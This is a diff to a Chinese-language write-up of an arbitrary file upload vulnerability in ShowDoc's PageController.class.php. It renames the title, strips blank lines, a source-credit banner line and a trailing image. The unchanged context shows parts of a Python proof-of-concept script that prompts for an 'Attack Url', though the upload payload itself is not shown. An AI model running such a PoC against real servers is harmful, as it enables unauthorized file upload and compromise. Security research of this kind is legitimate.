@@ -1,4 +1,4 @@
-# ShowDoc 任意文件上传漏洞
+# ShowDoc PageController.class.php 任意文件上传漏洞
 
 ## 漏洞描述
 
@@ -58,8 +58,6 @@ Content-Type: text/plain
 
 ## 漏洞POC
 
-
-
 ```python
 import requests
 import sys
@@ -70,7 +68,6 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 def title():
     print('+------------------------------------------')
-    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
     print('+  \033[34mTitle: ShowDoc 任意文件上传漏洞                                       \033[0m')
     print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
     print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
@@ -107,7 +104,3 @@ if __name__ == '__main__':
     target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
     POC_1(target_url)
 ```
-
-
-
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101920672.png)
